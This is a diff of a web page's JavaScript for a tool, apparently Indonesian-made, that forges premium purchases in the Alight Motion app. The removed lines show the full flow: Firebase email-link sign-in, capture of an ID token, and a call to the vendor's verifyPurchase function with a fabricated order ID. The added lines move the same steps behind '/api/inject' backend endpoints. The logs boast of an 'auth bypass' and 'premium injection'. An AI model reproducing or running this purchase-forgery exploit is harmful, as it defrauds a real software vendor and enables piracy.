-        }
-
-        function showAboutModal() {
-            document.getElementById('aboutModal').classList.add('active');
-        }
-
-        function closeAboutModal() {
-            document.getElementById('aboutModal').classList.remove('active');
-        }
-
-        // --- 5. LOGIKA EKSTRAKSI OOB CODE ---
-        function getRandomInt(min, max) {
-            return Math.floor(Math.random() * (max - min + 1)) + min;
-        }
+        function getRandomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
 
         function extractOobCode(fullUrl) {
             if (!fullUrl) return null;
             try {
                 let cleanUrl = fullUrl.replace(/&amp;/g, '&');
                 try { cleanUrl = decodeURIComponent(cleanUrl); } catch(e) {}
-                
                 try {
-                    const urlObj = new URL(cleanUrl);
-                    let oobCode = urlObj.searchParams.get('oobCode');
-                    if (!oobCode) {
-                        const nestedLink = urlObj.searchParams.get('link') || urlObj.searchParams.get('q') || urlObj.searchParams.get('url');
-                        if (nestedLink) {
-                            const innerUrlObj = new URL(nestedLink);
-                            oobCode = innerUrlObj.searchParams.get('oobCode');
-                        }
-                    }
+                    const urlObj = new URL(cleanUrl); let oobCode = urlObj.searchParams.get('oobCode');
+                    if (!oobCode) { const nestedLink = urlObj.searchParams.get('link') || urlObj.searchParams.get('q') || urlObj.searchParams.get('url'); if (nestedLink) { const innerUrlObj = new URL(nestedLink); oobCode = innerUrlObj.searchParams.get('oobCode'); } }
                     if (oobCode) return oobCode.replace(/[^a-zA-Z0-9_-]/g, '');
                 } catch (e) {}
-
                 const match = cleanUrl.match(/[?&]oobCode=([a-zA-Z0-9_-]+)/i) || cleanUrl.match(/oobCode=([a-zA-Z0-9_-]+)/i);
-                if (match && match[1]) return match[1];
-                return null;
-            } catch (e) {
-                return null;
-            }
+                if (match && match[1]) return match[1]; return null;
+            } catch (e) { return null; }
         }
 
-        // --- 6. PROSES API ---
+        // ==========================================
+        // 🔒 API CALLS (MENEMBAK BACKEND VERCEL)
+        // ==========================================
+        
         async function sendMagicLink() {
             const email = document.getElementById('emailInput').value;
-            if (!email || !email.includes('@')) {
-                alert('Format email target tidak valid!');
-                return;
-            }
-
-            document.getElementById('logText').innerHTML = ''; // Clear old logs
-            showLog(`Initiating connection for target: ${email}...`);
+            if (!email || !email.includes('@')) { alert('Format email target tidak valid!'); return; }
+            document.getElementById('logText').innerHTML = ''; 
+            showLog(`Transmitting payload to Zukai Serverless Backend...`);
 
             try {
-                // Proses API asli milikmu
-                await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/createAuthUri?key=${CONFIG.API_KEY}`, {
+                const res = await fetch('/api/magic-link', {
                     method: 'POST',
-                    headers: CONFIG.HEADERS,
-                    body: JSON.stringify({ identifier: email, continueUri: "http://localhost" })
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email: email })
                 });
 
-                showLog("Generating OOB payload request...");
-
-                const res = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/getOobConfirmationCode?key=${CONFIG.API_KEY}`, {
-                    method: 'POST',
-                    headers: CONFIG.HEADERS,
-                    body: JSON.stringify({
-                        requestType: 6,
-                        email: email,
-                        androidInstallApp: true,
-                        canHandleCodeInApp: true,
-                        continueUrl: "https://alightcreative.com?ui_sid=0366624874&ui_sd=0",
-                        iosBundleId: "com.alightcreative.motion",
-                        androidPackageName: "com.alightcreative.motion",
-                        androidMinimumVersion: "585",
-                        clientType: "CLIENT_TYPE_ANDROID"
-                    })
-                });
-
-                if (res.ok) {
-                    showLog("Magic Link successfully transmitted. Awaiting user input...");
+                const data = await res.json();
+                if (res.ok && data.status === 'success') {
+                    showLog(data.message);
                     document.getElementById('targetBuyerDisplay').innerText = email;
-                    
-                    // Transisi Animasi UI
                     document.getElementById('step1').style.display = 'none';
                     const step2 = document.getElementById('step2');
-                    step2.style.display = 'block';
-                    step2.classList.add('anim-stagger-1');
-                    
+                    step2.style.display = 'block'; step2.classList.add('anim-stagger-1');
                 } else {
-                    const err = await res.json();
-                    showLog("Transmission Failed: " + JSON.stringify(err), true);
+                    showLog("Server Error: " + data.message, true);
                 }
-            } catch (err) {
-                showLog("Network Error: " + err.message, true);
-            }
+            } catch (err) { showLog("Network Error: " + err.message, true); }
         }
 
         async function processPremium() {
@@ -638,76 +310,34 @@
             const rawLink = document.getElementById('linkInput').value;
             const customPrefix = document.getElementById('orderIdInput').value || "ZUKAIxDev-VIP-0000-";
 
-            if (!rawLink) {
-                alert('Silakan tempel (paste) Magic Link URL!');
-                return;
-            }
-
+            if (!rawLink) { alert('Silakan tempel (paste) Magic Link URL!'); return; }
             const oobCode = extractOobCode(rawLink);
-            if (!oobCode) {
-                showLog('Invalid URL structure or missing OOB parameter!', true);
-                return;
-            }
+            if (!oobCode) { showLog('Invalid URL structure or missing OOB parameter!', true); return; }
+            
+            const codeOrder = getRandomInt(10000, 99999).toString();
+            const finalOrderId = customPrefix + codeOrder;
 
-            showLog("Validating payload & authenticating identity...");
+            showLog("Validating payload via Secure Backend API...");
 
             try {
-                const signinRes = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/emailLinkSignin?key=${CONFIG.API_KEY}`, {
+                const res = await fetch('/api/inject', {
                     method: 'POST',
-                    headers: CONFIG.HEADERS,
-                    body: JSON.stringify({
-                        email: email,
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        email: email, 
                         oobCode: oobCode,
-                        clientType: "CLIENT_TYPE_ANDROID"
+                        orderId: finalOrderId 
                     })
                 });
 
-                const signinData = await signinRes.json();
-                if (!signinRes.ok) throw new Error(JSON.stringify(signinData));
-
-                const idToken = signinData.idToken;
-                showLog("Auth bypass successful. Forcing premium injection...");
-
-                const codeOrder = getRandomInt(10000, 99999).toString();
-                const finalOrderId = customPrefix + codeOrder;
-
-                const premiumRes = await fetch('https://us-central1-alight-creative.cloudfunctions.net/verifyPurchase', {
-                    method: 'POST',
-                    headers: {
-                        "authorization": "Bearer " + idToken,
-                        "firebase-instance-id-token": CONFIG.FIREBASE_INSTANCE_ID_TOKEN,
-                        "content-type": "application/json; charset=utf-8"
-                    },
-                    body: JSON.stringify({
-                        data: {
-                            productId: CONFIG.PRODUCT_ID,
-                            token: CONFIG.TOKEN,
-                            skuType: CONFIG.SKU_TYPE,
-                            orderId: finalOrderId
-                        }
-                    })
-                });
-
-                const premiumData = await premiumRes.json();
-                
-                showLog(`INJECTION COMPLETE. Order ID: ${finalOrderId}`);
-                
-                // MENGGANTI ALERT DENGAN CUSTOM SUCCESS MODAL
-                setTimeout(() => {
-                    showSuccessModal(email, finalOrderId);
-                }, 500); // delay dikit biar animasi terasa
-
-            } catch (err) {
-                showLog("Injection sequence failed: " + err.message, true);
-            }
-        }
-
-        function resetForm() {
-            document.getElementById('step1').style.display = 'block';
-            document.getElementById('step2').style.display = 'none';
-            document.getElementById('linkInput').value = '';
-            document.getElementById('statusLog').classList.add('d-none');
-            document.getElementById('logText').innerHTML = '';
+                const data = await res.json();
+                if (res.ok && data.status === 'success') {
+                    showLog(`INJECTION COMPLETE. Response ID: ${data.orderId}`);
+                    setTimeout(() => { showSuccessModal(email, data.orderId); }, 500); 
+                } else {
+                    showLog("API Error: " + data.message, true);
+                }
+            } catch (err) { showLog("Injection Failed: " + err.message, true); }
         }
     </script>
 </body>
